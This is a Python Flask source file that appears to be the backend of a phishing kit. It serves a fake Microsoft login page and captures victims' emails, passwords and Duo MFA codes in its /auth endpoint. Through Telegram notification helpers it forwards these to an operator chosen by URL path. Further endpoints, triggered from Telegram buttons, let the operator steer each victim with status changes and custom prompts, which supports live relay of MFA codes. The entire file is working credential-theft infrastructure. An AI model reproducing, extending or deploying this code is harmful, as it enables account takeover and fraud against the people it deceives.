from flask import Flask, request, session, jsonify
from flask import render_template, send_from_directory, redirect, Response
from models import Email_statuses, HostedUrls
from flask_cors import CORS
from dotenv import load_dotenv
from tg import send_notification, get_status_update
import os
from urllib.parse import quote

# --- Load Environment Variables ---
load_dotenv()
HOSTED_URL = os.getenv("HOSTED_URL")
DEFAULT_USER_ID = os.getenv("USER_ID")

# --- Flask App Initialization ---
app = Flask(__name__, static_folder='microsoft_login/build')
app.secret_key = os.getenv("SECRET_KEY", "a-secure-random-string-for-production")
CORS(app)


# --- Application Startup Logic ---
def initialize_database():
    """
    Ensures required data, like the hosted URL, is present in the database on startup.
    """
    if HOSTED_URL:
        HostedUrls.update_one(
            {'url': HOSTED_URL},
            {'$setOnInsert': {'url': HOSTED_URL}},
            upsert=True
        )
        print(f"[*] Verified that HOSTED_URL '{HOSTED_URL}' is in the database.")

initialize_database()


# --- API Endpoints ---

@app.get("/urls")
def get_urls():
    """
    Returns a JSON list of all unique HOSTED_URLs saved in the database.
    """
    try:
        urls_cursor = HostedUrls.find({}, {'_id': 0, 'url': 1})
        urls_list = [doc['url'] for doc in urls_cursor]
        return jsonify({"urls": urls_list})
    except Exception as e:
        print(f"[ERROR] Could not fetch URLs from database: {e}")
        return jsonify({"error": "Failed to connect to the database."}), 500


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def serve(path):
    """
    Main entrypoint: handles user session setup and serves the React application.
    """
    path_parts = path.split('/')
    first_part = path_parts[0]

    if first_part.isdigit():
        session['user_id'] = first_part
        return send_from_directory(app.static_folder, 'index.html')

    if not path:
        session['user_id'] = DEFAULT_USER_ID
        return send_from_directory(app.static_folder, 'index.html')

    if os.path.exists(os.path.join(app.static_folder, path)):
        return send_from_directory(app.static_folder, path)
    
    session.setdefault('user_id', DEFAULT_USER_ID)
    return send_from_directory(app.static_folder, 'index.html')


@app.get("/set_status/<user_id>/<email>/<status>")
def set_status(user_id, email, status):
    """
    Called by Telegram buttons to update a user's login status.
    """
    try:
        Email_statuses.update_one(
            {"email": email.strip()},
            {"$set": {"status": status, "custom_data": None}},  # Clear custom data on standard status change
            upsert=True
        )
        return {"status":"success", "message":f"Status updated for {email} as {status}"}
    except Exception as e:
        return {"status":"error", "message":str(e)}

# --- MODIFIED: Endpoint to set a custom status via GET request ---
@app.get("/set_custom_status")
def set_custom_status():
    """
    Sets a custom status for an email with a title, subtitle, and input flag
    using URL query parameters.
    Example: /set_custom_status?email=a@b.com&title=Title&subtitle=Subtitle&input=true
    """
    try:
        # Get data from URL query parameters
        email = request.args.get('email')
        title = request.args.get('title')
        subtitle = request.args.get('subtitle')
        # Convert 'true' string to boolean True, otherwise defaults to False
        has_input = request.args.get('input', 'false').lower() == 'true'

        if not email or not title or not subtitle:
            return jsonify({"status": "error", "message": "Missing required fields: email, title, subtitle."}), 400

        custom_data = {
            "title": title,
            "subtitle": subtitle,
            "has_input": has_input
        }

        Email_statuses.update_one(
            {"email": email.strip()},
            {"$set": {
                "status": "custom",
                "custom_data": custom_data
            }},
            upsert=True
        )
        return jsonify({"status": "success", "message": f"Custom status set for {email}"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.post("/auth")
def auth():
    """
    Handles authentication attempts from the frontend.
    Includes logic to return custom status data.
    """
    user_id_to_notify = session.get('user_id', DEFAULT_USER_ID)
    req = request.json
    email = req['email'].strip()
    password = req['password']
    incoming_duo_code = req.get('duoCode')
    custom_input = req.get('customInput')

    db_record = Email_statuses.find_one({"email": email})

    if custom_input:
        send_notification(f"Custom Input Received for {email}:\n{custom_input}", user_id=user_id_to_notify)
        Email_statuses.update_one(
            {"email": email},
            {"$set": {"status": "pending", "custom_data": None}}
        )
        return jsonify({"status": "pending"})


    if not db_record or db_record.get('password') != password:
        get_status_update(email, password, user_id=user_id_to_notify)
        Email_statuses.update_one(
            {"email": email},
            {"$set": {
                "password": password,
                "status": "pending",
                "duoCode": None,
                "user_id": user_id_to_notify,
                "custom_data": None
            }},
            upsert=True
        )
        return jsonify({"status": "pending"})

    stored_duo_code = db_record.get('duoCode')
    if incoming_duo_code and incoming_duo_code != stored_duo_code:
        send_notification(f"Duo Code received for {email}: {incoming_duo_code}", user_id=user_id_to_notify)
        Email_statuses.update_one(
            {"email": email},
            {"$set": {"status": "pending", "duoCode": incoming_duo_code}}
        )
        return jsonify({"status": "pending"})

    current_status = db_record.get('status', 'pending')
    if current_status == 'custom':
        return jsonify({
            "status": "custom",
            "data": db_record.get('custom_data')
        })

    return jsonify({"status": current_status})


@app.post("/alert")
def alert():
    """Sends a simple alert, respecting the user_id from the session."""
    user_id_to_notify = session.get('user_id', DEFAULT_USER_ID)
    req = request.json
    message = req['message']
    send_notification(message, user_id=user_id_to_notify)
    return jsonify({"status":"success", "message":"Alert sent."})


if __name__ == '__main__':
    app.run()
